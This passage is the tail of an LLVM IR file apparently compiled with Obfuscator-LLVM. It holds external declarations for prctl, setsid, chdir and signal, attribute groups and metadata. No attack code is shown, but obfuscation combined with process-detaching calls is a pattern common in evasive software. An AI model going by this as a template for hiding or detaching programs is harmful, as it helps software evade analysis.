                                                  ; No predecessors!
  %430 = load i32, i32* %3, align 4
  ret i32 %430
}

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146482628}
!2 = !{i32 -2146481937}
!3 = !{i32 -2146481188}
!4 = !{i32 -2146480365}
!5 = !{i32 -2146479443}
!6 = !{i32 -2146478060}
